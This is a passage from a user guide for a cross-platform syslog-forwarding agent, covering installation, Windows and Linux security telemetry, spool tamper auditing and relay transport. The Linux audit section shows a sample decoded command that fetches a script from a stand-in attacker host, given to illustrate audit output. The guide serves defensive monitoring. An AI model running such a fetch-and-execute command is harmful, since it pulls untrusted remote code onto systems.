# LUnA — User Guide

A practical guide to installing, configuring, running, and operating the agent. For the exact meaning of every
config key see the **[Configuration Reference](CONFIGURATION.md)**; this guide is the task-oriented walkthrough.

> The agent is **vendor-neutral**: it forwards standard **syslog (RFC 5424) over TCP/TLS** to *any* aggregator
> (a SIEM, a plain syslog collector, or a [logrok](https://github.com/logiqum/logrok) deployment). This guide is written
> aggregator-agnostically; see [Using with logrok](#using-with-logrok) for the platform-specific setup.

## What it does

```
  your endpoints/devices                 the agent                         your aggregator
 ┌──────────────────────┐      ┌──────────────────────────────┐      ┌─────────────────────┐
 │ Windows Event Log    │─────►│ collect → filter/enrich →    │─────►│ syslog-ng / SIEM /  │
 │ log files · journald │      │ buffer (disk) → forward      │ RFC  │ logrok / any        │
 │ syslog from devices  │      │ as RFC 5424 over TLS         │ 5424 │ syslog:TLS listener │
 └──────────────────────┘      └──────────────────────────────┘      └─────────────────────┘
```

One static, dependency-free binary. If the network or aggregator is down, events are written to a local disk
spool and replayed when it recovers — so an outage (or an air-gapped window) doesn't lose data.

## Requirements

- A host running **Windows, Linux, or macOS** — including ARM (Raspberry Pi / SBC gateways) on Linux and
  Apple Silicon on macOS.
- An aggregator that accepts syslog over TCP (TLS recommended), reachable at a `host:port` you control.

Install a released package for your platform (below): Linux `.deb`/`.rpm`, Windows `.msi`, macOS `.pkg`.
A single self-contained binary — no runtime, agent, or dependencies to install.

## Install

### Linux — Debian package (recommended)
Releases ship `.deb` packages for amd64/arm64/armhf. They install the binary, a hardened systemd unit
(`logrok-agent.service`), a dedicated `logrok-agent` system user, and the config/spool directories:
```sh
sudo dpkg -i logrok-universal-agent_<version>_amd64.deb
sudo editor /etc/logrok-agent/agent.yaml      # inputs + output endpoint (+ optional management)
sudo systemctl enable --now logrok-agent
```
Your config is a dpkg conffile — upgrades never overwrite it. `dpkg -r` keeps the spool and user
(undelivered events are data); `dpkg -P` (purge) removes both.

### Linux — RPM (RHEL / Rocky / Alma / SUSE / Amazon Linux)
Same contents and semantics as the deb (x86_64/aarch64/armv7hl):
```sh
sudo rpm -i logrok-universal-agent-<version>-1.x86_64.rpm
sudo editor /etc/logrok-agent/agent.yaml
sudo systemctl enable --now logrok-agent
```
The config is `%config(noreplace)` — upgrades keep your edits (new defaults land as `.rpmnew`). Erasing
the package keeps the spool and user (RPM has no purge); remove `/var/lib/logrok-agent` manually if desired.

### Container (gateway / Kubernetes)
Releases publish `ghcr.io/logiqum/luna:<version>` (distroless, static binary, runs as
nonroot; **multi-arch: amd64 + arm64** — Pi/SBC gateways pull the right image automatically). Mount your
config and a spool volume:
```sh
docker run -d --name logrok-agent \
  -v /etc/logrok-agent/agent.yaml:/etc/logrok-agent/agent.yaml:ro \
  -v logrok-spool:/var/lib/logrok-agent \
  -p 5514:5514 \
  ghcr.io/logiqum/luna:latest
```
Typical use: the `syslog_in` gateway relay (devices → container → aggregator). Inputs that read host
files need the relevant paths mounted read-only.

### Linux — run it
Foreground (good for first run / debugging):
```sh
logrok-universal-agent -config /etc/logrok-agent/agent.yaml
```
As a service (systemd unit, `/etc/systemd/system/logrok-agent.service`):
```ini
[Unit]
Description=logrok universal agent
After=network-online.target

[Service]
ExecStart=/usr/local/bin/logrok-universal-agent -config /etc/logrok-agent/agent.yaml
Restart=always
User=logrok-agent

[Install]
WantedBy=multi-user.target
```
```sh
sudo systemctl enable --now logrok-agent
```

### Windows — MSI (recommended)
Releases ship `logrok-universal-agent_<version>_windows-amd64.msi`:
```bat
msiexec /i logrok-universal-agent_<version>_windows-amd64.msi /qn
```
It installs the binary under `C:\Program Files\logrok-universal-agent\`, a default config at
`C:\ProgramData\logrok-universal-agent\agent.yaml` (valid out of the box — the service starts and spools
until you set your aggregator endpoint), and an auto-start **LocalSystem** service. Edit the config, then
`sc stop logrok-universal-agent & sc start logrok-universal-agent`. **Upgrades keep your edited config**
(install the new MSI over the old); **uninstall keeps the config and the spool** (delete
`C:\ProgramData\logrok-universal-agent\` manually for a purge). Release `.exe` and `.msi` artifacts are
Authenticode-signed (signer: Logiqum Kft.) — verify with `Get-AuthenticodeSignature` before installing.

### Windows — run it manually
Interactively (first run / debugging) from an elevated prompt:
```bat
logrok-universal-agent.exe -config C:\ProgramData\logrok-universal-agent\agent.yaml
```
As a Windows service without the MSI:
```bat
sc create LogrokUniversalAgent binPath= "\"C:\Program Files\logrok-universal-agent\logrok-universal-agent.exe\" -config C:\ProgramData\logrok-universal-agent\agent.yaml" start= auto
sc start LogrokUniversalAgent
```
The binary auto-detects whether it was launched by the Service Control Manager (runs as a service) or
interactively (runs in the foreground with Ctrl+C handling). Collecting the **Security** channel requires the
service to run with administrator privileges; without them that channel is skipped (others continue).

### macOS install (.pkg + LaunchDaemon)

Install the `logrok-universal-agent-<version>-<arch>.pkg` (Intel = `amd64`, Apple Silicon = `arm64`):

```bash
sudo installer -pkg logrok-universal-agent-<version>-amd64.pkg -target /
```

The package installs to `/usr/local` by default:
- binary: `/usr/local/bin/logrok-universal-agent`
- config: `/usr/local/etc/logrok-agent/agent.yaml` (edit this; preserved on upgrade)
- LaunchDaemon: `/Library/LaunchDaemons/com.logiqum.logrok-agent.plist` (auto-starts at boot)
- spool/state: `/usr/local/var/db/logrok-agent/` (kept on uninstall)

After editing the config, (re)load the service:

```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.logiqum.logrok-agent.plist 2>/dev/null || true
sudo launchctl bootstrap system /Library/LaunchDaemons/com.logiqum.logrok-agent.plist
```

> **Unsigned package note:** current `.pkg` builds are unsigned (Developer ID signing + notarization are a
> follow-up). Gatekeeper blocks a double-clicked unsigned installer; install via the `sudo installer`
> command above, or right-click → Open. The `oslog` input reads the unified log via `/usr/bin/log` and needs
> to run as root (the LaunchDaemon does).

Uninstall (keeps spool + config):

```bash
sudo /usr/local/bin/logrok-universal-agent-uninstall
```

### Solaris (supported) · AIX / BSDs (extended, cross-compiled)
Releases ship binaries for `solaris-amd64`, `aix-ppc64`, `freebsd-{amd64,arm64}`, `openbsd-amd64`, and
`netbsd-amd64` (pure-Go cross-builds; file tail + syslog-in/out + spool work identically — there's no
platform-specific code in those paths). FreeBSD notably covers pfSense/OPNsense/TrueNAS-class appliance
hosts. **`solaris-amd64` is runtime-verified** — the full test suite runs on real Solaris 11.4 hardware in
the release verification. **AIX and the BSDs are cross-compiled and vetted but not yet runtime-verified** (no
such hardware yet — treat accordingly). Binary only: bring your own service integration (SRC `mkssys` on AIX,
SMF manifest on Solaris, `rc.d` on the BSDs). If you run an AIX/BSD estate (banks: your Power boxes), we're
looking for design partners — your feedback drives those to runtime-verified status too. (HP-UX is not
possible: Go has no HP-UX port.)

## Quick start

1. **Create `agent.yaml`** — start from [`configs/agent.example.yaml`](../configs/agent.example.yaml). Minimal Linux example:
   ```yaml
   service: { mode: standalone, log_level: info }
   buffer:  { enabled: true, dir: /var/lib/logrok-agent/spool }
   inputs:
     - { type: filetail, path: /var/log/syslog }
   outputs:
     - { type: syslog, endpoint: "your-aggregator:6514", tls: true,
         ca_file: /etc/logrok-agent/ca.pem }
   ```
2. **Run it** (foreground): `logrok-universal-agent -config agent.yaml`
3. **Verify** — set `service.metrics_listen: "127.0.0.1:9090"` and check `curl -s localhost:9090/metrics | grep events_out` climbs, and confirm your aggregator receives the events.

## Configuring

All options, with defaults and implemented/planned status, are in the **[Configuration Reference](CONFIGURATION.md)**.
The shape: `service`, `management`, `buffer`, then lists of `inputs` / `processors` / `outputs` where each entry
has a `type` plus that module's own keys. Today's modules:

- **Inputs:** `windows_eventlog`, `etw` (Windows ETW real-time trace sessions — kernel/analytic telemetry that never reaches the Event Log; see [Windows ETW — telemetry beyond the Event Log](#windows-etw--telemetry-beyond-the-event-log)), `wmi` (Windows WMI/CIM system inventory & state via WQL polling; see [Windows WMI — system inventory & state via WQL](#windows-wmi--system-inventory--state-via-wql)), `filetail` (globs, rotation, multiline, restart-resume, plus `format: cri|docker|auto` for Kubernetes container-log parsing — see [Kubernetes](#kubernetes)), `journald` (Linux), `linux_audit` (Linux kernel audit trail — process executions, file-access watches, logins; see [Linux audit trail — kernel-level security events](#linux-audit-trail--kernel-level-security-events)), `oslog` (macOS), `syslog_in`, `relay_in` (ack'd-transport receiver), `http_in` (HTTP(S) POST ingress — webhooks/IoT/edge), `mqtt_in` (MQTT 3.1.1 subscriber — IoT/edge brokers)
- **Processors:** `add_fields`, `filter`, `expr` (conditional set/drop/rename), `parse_json` / `parse_csv` / `parse_kv` / `parse_xml` (message → fields), `sample` / `throttle` / `dedup` / `trim_fields` (edge volume reduction — see [Reduce volume at the edge](#reduce-volume-at-the-edge))
- **Outputs:** `syslog` (TLS / mTLS, UDP diode mode, JSON encoding), `snare` (Snare / "MSWinEventLog" tab-delimited format over syslog — drop-in interop for a SIEM configured for a legacy NXLog/Snare feed; shares the syslog transport), `relay` (ack'd reliable transport, agent→agent), `otlp` (OpenTelemetry Protocol, gRPC or HTTP), `hec` (Splunk HTTP Event Collector — response-mode or opt-in indexer-ack commit; see [Forwarding to Splunk (HEC)](#forwarding-to-splunk-hec))
- **Control-plane channel** (`management`): the central-management connection also supports mTLS, mirroring the syslog output. Set `management.tls.cert_file`/`tls.key_file` to present a client certificate to the control plane, and `management.tls.ca_file` to pin the control-plane server's CA instead of relying on system roots. `tls.mode: static` uses operator-provided cert files; `tls.mode: enrolled` is now available — the agent obtains and auto-renews a control-plane-issued client cert (no manual cert files needed), with the private key generated locally and never leaving the host. Revocation is handled by the control plane — enrolled certs are short-lived and simply stop being renewed — which requires a control plane implementing the agent-cert lifecycle (the logrok control plane ships it: per-tenant CA, short-lived auto-renewed client certs, instant revocation; any compatible implementation can provide the same endpoints). The enrolled cert can also be presented on the **data plane** via `cert_source: enrolled` on `syslog`/`relay` outputs — see [Securing the link](#securing-the-link-tls--mtls) below.

## Deployment scenarios

> Deploying for an audit? See the [compliance mapping pack](compliance/README.md) — PCI DSS 10,
> NERC CIP-007 R4, NIS2, DORA, CMMC/800-171 AU: requirement → agent capability, honestly scoped.

### Windows endpoint → aggregator
Event Log → forward, dropping low-severity noise:
```yaml
service: { mode: service, log_level: info }
buffer:  { enabled: true, dir: 'C:\ProgramData\logrok-universal-agent\spool' }
inputs:
  - { type: windows_eventlog, channels: [Application, System, Security] }
processors:
  - { type: filter, max_severity: 5 }     # drop info(6)/debug(7)
outputs:
  - { type: syslog, endpoint: "aggregator:6514", tls: true,
      ca_file: 'C:\ProgramData\logrok-universal-agent\ca.pem' }
```

### Windows security telemetry — Sysmon

[Sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon) (Sysinternals) records
security-grade endpoint telemetry — process creation with full command lines and hashes, network
connections, DNS queries, registry changes — into a **regular Event Log channel**
(`Microsoft-Windows-Sysmon/Operational`), so the agent collects it with the existing
`windows_eventlog` input. No extra agent, no ETW:

```yaml
inputs:
  - type: windows_eventlog
    name: sysmon
    channels: [Microsoft-Windows-Sysmon/Operational]
    # optional: subscribe only to a high-signal set (1 ProcessCreate, 3 NetworkConnect,
    # 22 DNSQuery, ... — IDs per the Sysinternals reference)
    # query: "*[System[(EventID=1 or EventID=3 or EventID=22)]]"
```

Full annotated preset (channels, ID reference, noise-reduction examples):
[`configs/sysmon.example.yaml`](../configs/sysmon.example.yaml).

Two operational notes:
- **Filter in Sysmon's own XML config first** (its include/exclude rules are the cheapest place to cut
  noise — ImageLoad (7) and ProcessAccess (10) are documented high-volume types); the agent's
  `query`/processors are the second line when you can't change the Sysmon config.
- Sysmon events are *Informational level*, so severity filters won't reduce them — filter on the
  `event_id` field (see the preset's `expr` example) or with the XPath `query`.

### Windows event IDs worth collecting

`windows_eventlog` can subscribe to any channel and filter with an XPath `query`, but a blank subscription to
`Security` on a busy domain-joined host is thousands of low-value events an hour. Below is a **starting set** —
the well-established, Microsoft- and Sysmon-documented IDs most security teams start with — not an exhaustive
or definitive list. Tune it to your environment (add/remove IDs, narrow with `query`, layer `filter`/`expr`).

| Event ID | Channel | What it signals | Example `query` |
|---|---|---|---|
| 4624 | `Security` | Successful logon | `*[System[(EventID=4624)]]` |
| 4625 | `Security` | Failed logon (brute-force / password-spray signal) | `*[System[(EventID=4625)]]` |
| 4634 | `Security` | Logoff | `*[System[(EventID=4634)]]` |
| 4647 | `Security` | User-initiated logoff | `*[System[(EventID=4647)]]` |
| 4688 | `Security` | Process creation (command line included only if "Include command line in process creation events" GPO is enabled) | `*[System[(EventID=4688)]]` |
| 4720 | `Security` | User account created | `*[System[(EventID=4720)]]` |
| 4726 | `Security` | User account deleted | `*[System[(EventID=4726)]]` |
| 4728 | `Security` | Member added to a security-enabled **global** group | `*[System[(EventID=4728)]]` |
| 4732 | `Security` | Member added to a security-enabled **local** group | `*[System[(EventID=4732)]]` |
| 4672 | `Security` | Special/admin privileges assigned to a new logon | `*[System[(EventID=4672)]]` |
| 4698 | `Security` | Scheduled task created (persistence signal) | `*[System[(EventID=4698)]]` |
| 7045 | `System` | New service installed (persistence / lateral-movement signal) | `*[System[(EventID=7045)]]` |
| 4104 | `Microsoft-Windows-PowerShell/Operational` | PowerShell script block logging (captures deobfuscated script content) | `*[System[(EventID=4104)]]` |
| 1 | `Microsoft-Windows-Sysmon/Operational` | Sysmon ProcessCreate | `*[System[(EventID=1)]]` |
| 3 | `Microsoft-Windows-Sysmon/Operational` | Sysmon NetworkConnect | `*[System[(EventID=3)]]` |
| 11 | `Microsoft-Windows-Sysmon/Operational` | Sysmon FileCreate | `*[System[(EventID=11)]]` |
| 22 | `Microsoft-Windows-Sysmon/Operational` | Sysmon DNSQuery | `*[System[(EventID=22)]]` |

Two ready-to-paste examples — subscribe to just the logon/process IDs on `Security`, and just the
process/network/DNS IDs on Sysmon:

```yaml
inputs:
  - type: windows_eventlog
    name: security-core
    channels: [Security]
    query: "*[System[(EventID=4624 or EventID=4625 or EventID=4688 or EventID=4672)]]"

  - type: windows_eventlog
    name: sysmon-core
    channels: [Microsoft-Windows-Sysmon/Operational]
    query: "*[System[(EventID=1 or EventID=3 or EventID=11 or EventID=22)]]"
```

Note the same channel/GPO caveat as Sysmon above: `Security` collection requires the service to run with
administrator privileges (see [Troubleshooting](#troubleshooting)), and 4688's command-line field is only
populated when the corresponding GPO is turned on.

Full annotated preset combining this starting set (Security + System + PowerShell + Sysmon) into one config:
[`configs/windows-security.example.yaml`](../configs/windows-security.example.yaml).

### Windows ETW — telemetry beyond the Event Log

**ETW (Event Tracing for Windows)** is the OS's high-volume, real-time tracing system that sits
underneath the Event Log. Thousands of "providers" — the kernel and nearly every Windows component —
emit events through it, and most of that telemetry never lands in any Event Log channel: kernel process
and network activity, DNS Client analytic tracing, Time/Update service traces. Rule of thumb: **the
Event Log is for durable, admin-facing events; ETW is for high-rate diagnostic/analytic telemetry.**
Start with `windows_eventlog`; reach for the `etw` input when the data you need isn't in any channel.

The agent starts its own real-time trace session and enables the providers you list — by GUID, or by
registered manifest-provider name. Discover what a host offers with `logman query providers` (it lists
both names and GUIDs). Example: kernel process-lifecycle events, forwarded as syslog:

```yaml
service: { mode: service, log_level: info }
buffer:  { enabled: true, dir: 'C:\ProgramData\logrok-universal-agent\spool' }
inputs:
  - type: etw
    name: kernel-process
    providers:
      - "{22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}"   # Microsoft-Windows-Kernel-Process
    match_any_keyword: "0x10"                        # WINEVENT_KEYWORD_PROCESS (process start/stop)
    level: info
outputs:
  - { type: syslog, endpoint: "aggregator:6514", tls: true,
      ca_file: 'C:\ProgramData\logrok-universal-agent\ca.pem' }
```

Operator notes:

- **Privileges.** Real-time ETW sessions need **Administrator** or membership in the **Performance Log
  Users** group. Without either, the input fails at start with an explicit error — there is no degraded
  mode.
- **High-rate providers can drop.** The ETW callback must never block (stalling it would make ETW itself
  drop silently), so when a chatty provider outruns the pipeline the input **counts and drops** with a
  warning log. Size `buffer_events` up, lower `level`, or narrow `match_any_keyword` — mechanics in the
  [Configuration Reference](CONFIGURATION.md)'s `etw` section.
- **Decoding is a documented subset.** Manifest-based providers (the `Microsoft-Windows-*` estate) decode
  fully into fields; **WPP and TraceLogging-only providers arrive header-only** (provider + summary
  message).

### Windows WMI — system inventory & state via WQL

**WMI (Windows Management Instrumentation)** is Windows' system-inventory and live-state surface: running
services, disks, installed hotfixes, hardware, process lists, network configuration. You query it with **WQL**,
a small SQL-ish language (`SELECT … FROM <class> WHERE …`). The `wmi` input runs a WQL query you supply on a
fixed interval and forwards each returned instance as an event — one event per instance, one field per
property. Reach for it when the signal you want is **state you have to ask for**, not a stream of records:
"which services are running right now", "what OS build is this host on", "which disks are near full". For a
stream of security events, stay with `windows_eventlog`; for high-rate diagnostic tracing, `etw`.

Example — forward the set of currently-running services every 60 seconds:

```yaml
service: { mode: service, log_level: info }
buffer:  { enabled: true, dir: 'C:\ProgramData\logrok-universal-agent\spool' }
inputs:
  - type: wmi
    name: running-services
    query: "SELECT Name,DisplayName,State,ProcessId FROM Win32_Service WHERE State='Running'"
    interval: 60s
outputs:
  - { type: syslog, endpoint: "aggregator:6514", tls: true,
      ca_file: 'C:\ProgramData\logrok-universal-agent\ca.pem' }
```

Operator notes:

- **WMI is polled, not streamed.** Each `interval` re-runs the query and emits the *current* result set —
  pick an interval that matches how fast the state changes (inventory: minutes; volatile state: tens of
  seconds). A tighter interval means more PowerShell spawns.
- **PowerShell is required.** The input shells out to PowerShell (`Get-CimInstance -Query … | ConvertTo-Json`)
  — the cgo-free way to reach WMI without a COM syscall layer. PowerShell ships with every supported Windows,
  so there's nothing to install; on non-Windows builds the input is a stub that errors if started.
- **A bad query fails loudly at startup.** A WQL syntax error, a missing namespace, or an access denial makes
  the first poll return an error so a misconfiguration surfaces immediately rather than silently spinning. An
  **empty result set is normal** — zero events, no error. Field/mapping mechanics (the noise-key skip, the
  `k=v` message, timestamp-is-now) are in the [Configuration Reference](CONFIGURATION.md)'s `wmi` section.

### Linux audit trail — kernel-level security events

The **Linux kernel audit system** (the thing behind `auditd`, `auditctl`, and `/var/log/audit/audit.log`)
records security-relevant activity at the kernel boundary: every login and privilege change out of the box,
and — once you load rules — **process executions with full command lines** and **file-access watches**. It's
the Linux counterpart of the Windows Security log, and the classic use case is an execve rule so every
command run on the host becomes an auditable event:

```bash
# Log every program execution (persist in /etc/audit/rules.d/ via augenrules)
auditctl -a always,exit -F arch=b64 -S execve -F key=exec-log
# Watch writes to a sensitive file
auditctl -w /etc/sudoers -p wa -k sudoers-change
```

One kernel audit event spans *several* raw records (SYSCALL + EXECVE + CWD + PATH(s) + PROCTITLE …) sharing
a serial number, with command lines scattered across hex-encoded fields. The `linux_audit` input does the
work a plain file tail can't: it **reassembles those records into one event per audit event**, hex-decodes
the EXECVE arguments into a single `argv` field, decodes `PROCTITLE`, and indexes the PATH records — so the
aggregator receives `argv="curl http://evil.example/x.sh"`, not five cryptic lines. Forwarded as syslog with
facility 13 ("log audit"):

```yaml
service: { mode: service, log_level: info }
buffer:  { enabled: true, dir: /var/lib/logrok-agent/spool }
inputs:
  - type: linux_audit                 # follows /var/log/audit/audit.log
outputs:
  - { type: syslog, endpoint: "aggregator:6514", tls: true,
      ca_file: /etc/logrok-agent/ca.pem }
```

Operator notes:

- **Privileges.** File mode (default) needs read access to `/var/log/audit/audit.log` (root-owned,
  typically `0640 root:adm` — run the agent as root or grant group membership). The alternative
  `mode: multicast` reads the kernel's live audit feed directly (no file dependency, coexists with a
  running auditd, never touches auditd's registration) but requires **`CAP_AUDIT_READ`** — typically
  root — and fails at start with an explicit error without it.
- **Rules are yours.** The agent only *reads* the audit stream — it never loads or modifies audit rules.
  No rules loaded = only the default PAM/login events flow.
- **Restart semantics (v1).** File mode keeps no offset checkpoint: a restart resumes from the end of the
  log (`read_from: beginning` re-reads the whole file). Details and the full option table in the
  [Configuration Reference](CONFIGURATION.md#linux_audit--linux-only)'s `linux_audit` section.

### Linux gateway — collect syslog from devices that can't run an agent
Constrained devices (appliances, IoT/OT sensors, ESP-class boards) **can't run the agent** — point them at a
gateway (any Linux box / Raspberry Pi) running the agent's `syslog_in` input; the gateway adds buffering, TLS,
and management the devices lack:
```yaml
service: { mode: standalone }
buffer:  { enabled: true, dir: /var/lib/logrok-agent/spool, max_bytes: 1073741824 }
inputs:
  - { type: syslog_in, listen: "0.0.0.0:5514", protocols: [tcp, udp] }
outputs:
  - { type: syslog, endpoint: "aggregator:6514", tls: true,
      ca_file: /etc/logrok-agent/ca.pem, cert_file: /etc/logrok-agent/agent.pem,
      key_file: /etc/logrok-agent/agent.key }
```

### Air-gapped / intermittent links
Set `buffer.enabled: true` with a `dir`. The agent keeps collecting and spooling to disk while disconnected
(bounded by `max_bytes`), then drains automatically when the link returns. This is the default reliability
posture — no extra setup beyond pointing `dir` at durable storage.

When the spool hits `max_bytes`, `buffer.when_full` decides what gives:
- `drop_oldest` (default) — discard the oldest spooled events, keep the freshest;
- `drop_newest` — keep the oldest, refuse new ones;
- `block` — **apply backpressure to the inputs instead of dropping** (zero loss; the source slows/stops until
  space frees). Watch `logrok_agent_backpressure_waits_total` to see it engage.

The on-disk spool is CRC-checked: a torn or corrupted record is skipped on replay rather than stalling delivery.

### Auditing the spool

Every disk-spooled record is chained with a keyed HMAC-SHA-256 (`buffer.chain_key_file` in
[CONFIGURATION.md](CONFIGURATION.md#buffer)) — on by default whenever `buffer.dir` is set, no extra
config needed. Run the offline auditor CLI against a **stopped agent, or a copy of the spool directory**
(a live agent's spool can be read too, but a concurrent append can show up as a benign torn tail — the
tool says so rather than misreading it as tamper):

```sh
logrok-universal-agent -verify-spool /var/lib/logrok-agent/spool -config /etc/logrok-agent/agent.yaml
# or, without a config file, point straight at the chain key:
logrok-universal-agent -verify-spool /var/lib/logrok-agent/spool -chain-key /var/lib/logrok-agent/spool-chain.key
```

It prints one verdict and exits accordingly:

- **`INTACT` (exit 0)** — every chained segment verified; no modification, deletion, insertion,
  reordering, tail-truncation, or front-truncation (oldest-segment deletion) detected.
- **`TAMPER EVIDENCE` (exit 1)** — at least one chain-verification failure; the report names the first
  divergence (segment, line, what failed) and how many records/headers failed.
- **`UNVERIFIABLE` (exit 2)** — the spool has no chained segments at all: either it predates this feature
  (all-legacy segments) or the directory has **zero segments**. A missing chain key file also exits 2 —
  the CLI never creates keys (an audit must not write); copy the agent's key alongside the spool copy. Those last two are indistinguishable from
  the outside: a spool that has fully drained (nothing outstanding, working as intended) looks identical to
  one that's been wiped. Don't read `UNVERIFIABLE` with 0 segments as either "fine" or "tampered" — it
  means "nothing here to check."

An **operational** error (typo'd path, unreadable `-config`, a garbage key file) is a separate loud line on
stderr and also exits 1 — it shares the exit code with `TAMPER EVIDENCE` but is not a tamper verdict. Read
the printed message, not just the exit code.

**What this does and doesn't cover — read before relying on it for an audit:**

- **A key-reader attacker can re-forge the chain.** This is a keyed MAC, not magic: if an attacker gets
  agent-level access and can read the chain-key file, they can rebuild a self-consistent chain over
  modified content. The mitigation is the product's existing posture — forward off-host promptly — plus
  keeping the key file **outside** the spool directory (the default resolution never puts it inside), so a
  copied/exfiltrated spool doesn't carry its own key.
- **The un-anchored tail window.** Anchors (the "how far is authenticated" marker in `head.json`) persist
  on segment rotation, on ack, and on clean close — not after every single write. Records appended since the
  last anchor persist can be **cleanly truncated** (the chain end snipped off) without detection; everything
  behind the last persisted anchor is fully covered.
- **Deleting `head.json`, or the whole spool directory.** If `head.json` is missing (or its anchor fields
  are stripped), the verifier degrades: it reports "anchors unavailable" and loses truncation detection,
  but does **not** call that tamper by itself — an absent anchor is not evidence, only garbled anchor
  *values* are (those fail authentication and do report as tamper). Deleting the entire spool directory is
  self-evident (the spool is simply gone) and outside what a chain can detect.
- **Front-truncation of already-acknowledged segments** (the head segments a normal drain deletes once
  fully sent) is indistinguishable from ordinary FIFO consumption — that's inherent, not a gap to close.
  This is separate from front-truncation of the *backlog* (deleting oldest segments an attacker shouldn't
  have touched), which the authenticated `head_prev` anchor now catches (above).
- **Anchor rollback to a consistent earlier state.** `head.json` lives inside the spool directory; its
  anchor authenticates the recorded position's *value* but not its *recency*. An attacker who possesses an
  earlier authentic `head.json` (e.g. from a backup) and truncates the spool back to exactly that earlier
  state can present a self-consistent snapshot that verifies `INTACT` — the offline verifier, seeing only
  the (rolled-back) directory, has no reference for "what was current." This is the general limit of any
  in-directory, offline-verified integrity scheme without external monotonic state. Mitigations: forward
  promptly off-host (shrinks the window to records not yet delivered), and store the recency high-water
  off-box (planned). Modification, insertion, reordering, and truncation that does NOT
  match a held earlier anchor remain detected.
- **Legacy-disguise.** An attacker who strips the MAC/header framing back down to the old unchained format
  evades the **runtime** flags (a chained agent gracefully drains legacy segments so upgrades don't wedge).
  The offline verifier still reports those as unverifiable-legacy segments, though — if you're auditing a
  spool that should be fully chained and see legacy segments you didn't expect, treat that as a finding,
  not a shrug. One benign source of *expected* legacy segments: a run where the chain key failed to load
  (e.g. a temporarily read-only state directory). Such a keyless run **rotates into fresh legacy
  segments** rather than writing into a chained one — the chain is never corrupted by a key outage; the
  outage's records simply drain unverified and the segments age out (counted by the
  `spool_chain_legacy_segments` metric).
- **Downgrading the agent (the escape hatch).** A pre-chain agent binary pointed at a chained spool
  cannot read chained records: its CRC framing check rejects them, so it skips them **as corrupt** —
  loudly (a warn log per dropped record, counted in the corrupt-dropped tally), never silently
  mis-decoded. That's deliberate downgrade safety, but it means chained records still in the spool are
  **dropped, not delivered**, by the old binary — drain the spool before rolling back a version if those
  records matter.
- **Runtime does not verify cross-segment ancestry.** A deleted *middle* segment is silent at runtime (the
  live drain only checks each segment's own header + records as it reads them). The offline `-verify-spool`
  *is* the authoritative check for that — run it as part of any audit, don't rely on the running agent
  alone.
- **The heartbeat `spool_tamper` flag is sticky, not authoritative.** It latches `true` on first detection
  and stays that way until the agent restarts or a config hot-reload rebuilds the management client — it
  won't clear itself once the underlying issue is gone. The durable evidence is the in-band
  `spool_tamper="true"` field on the affected events themselves, and the offline verifier's report — treat
  the heartbeat flag as a "go look" signal, not the record of what happened.

### Data diode / one-way link (OT zones)

Hardware data diodes and unidirectional gateways (Waterfall, Owl) pass **UDP only** — TCP needs a return
path that physically doesn't exist. To forward through one, switch the output to diode mode:

```yaml
outputs:
  - type: syslog
    endpoint: "diode-ingress:514"
    protocol: udp        # one datagram per message (RFC 5426); no framing, no TLS
    sequence: true       # [seq@99999 session=".." n=".."] SD per event
```

What to know about the trade-offs on a one-way link:

- **No delivery guarantee on the wire** — UDP is fire-and-forget and nothing can come back through the
  diode. `sequence: true` is the mitigation: the receiver detects **loss** as gaps in `n` and an **agent
  restart** as a `session` change. (It does not detect duplicates — a batch retried after a local send
  error gets fresh numbers.)
- **Keep the disk spool on** (`buffer.enabled: true`): local failures (NIC down, interface flap) still
  spool-and-drain; only what's lost *inside* the one-way path is invisible to the agent.
- **Datagram size**: messages are truncated to `max_datagram_size` (default 8192 bytes). Raise it only if
  every hop (diode included) handles larger datagrams/fragmentation.
- **Management plane**: leave `management.endpoint` empty on the OT side — config-pull and heartbeat need a
  return path. Manage the agent's config file through your normal OT change process (or a signed bundle).

### Loss-free hops — the ack'd relay transport

Plain syslog/TCP is fire-and-forget: a write can look successful before the peer rejects or loses it (a
TLS-refused client cert, a receiver crash mid-batch). For hops where that residual window matters, run a
**gateway/concentrator agent** with the `relay_in` input and point edge agents' `relay` output at it. The
sender gets an **application-level acknowledgment** per batch — anything unacknowledged lands back in the
disk spool and is retried, and a batch replayed after a dropped connection is **deduplicated** by the
receiver, so a lost ACK never duplicates events.

Edge agent:
```yaml
outputs:
  - type: relay
    endpoint: "gateway:16576"
    tls: true
    ca_file: /etc/logrok-agent/ca.pem
    compress: true          # gzip the batches (slow/expensive WAN links)
```

Gateway agent (receives from edges, forwards standard syslog to any aggregator):
```yaml
inputs:
  - type: relay_in
    listen: "0.0.0.0:16576"
    tls_cert_file: /etc/logrok-agent/server.pem
    tls_key_file: /etc/logrok-agent/server.key
    tls_client_ca_file: /etc/logrok-agent/ca.pem   # mTLS: only your agents can connect
outputs:
  - { type: syslog, endpoint: "aggregator:6514", tls: true, ca_file: /etc/logrok-agent/ca.pem }
```

The chain at a glance — where the application-level ack lives, and what covers each hop:

```
 edge agent                        gateway agent                       aggregator
┌─────────────────────┐  relay   ┌──────────────────────┐  RFC 5424  ┌──────────────────────┐
│ inputs → pipeline → │═════════►│ relay_in → pipeline → │───────────►│ syslog listener      │
│ spool → relay out   │◄── ACK ──│ spool → syslog out    │  TCP/TLS   │ (logrok, SIEM, any)  │
└─────────────────────┘          └──────────────────────┘            └──────────────────────┘
  segment 1: app-acked             segment 2: standard syslog          delivery visible in the
  ACK arrives only after the       backed by the gateway's disk        aggregator (search/count)
  gateway DURABLY committed        spool + connection-liveness
  the batch (never on receipt)     probes on every (re)dial
```

The ack'd wire itself, frame by frame — including what happens when a connection drops mid-stream:

```
 edge (sender)                                        gateway (receiver)
    │  HELLO  session-id · protocol version                │
    │─────────────────────────────────────────────────────►│  creates per-session state
    │  DATA  seq=41  (batch of events)                     │
    │─────────────────────────────────────────────────────►│  events carry commit closures
    │                                        ACK 41        │  sent only after EVERY event of
    │◄─────────────────────────────────────────────────────│  frame 41 is spooled/delivered
    │  batch 41 may now be forgotten                       │
    │  DATA  seq=42  ──── connection drops before ACK ─────│
    │  reconnect → replay every un-ACKed frame             │
    │  DATA  seq=42  (replay)                              │
    │─────────────────────────────────────────────────────►│  already committed? DEDUP by
    │                                 ACK 42 (committed)   │  (session, seq): re-ACK, never
    │◄─────────────────────────────────────────────────────│  re-emit — no duplicates stored
```

The relay protocol is agent↔agent (syslog-ng PE sells this as ALTP; ours ships in the box) — the final hop
to the aggregator stays standard RFC 5424, so the chain ends vendor-neutral. The gateway ACKs only after a
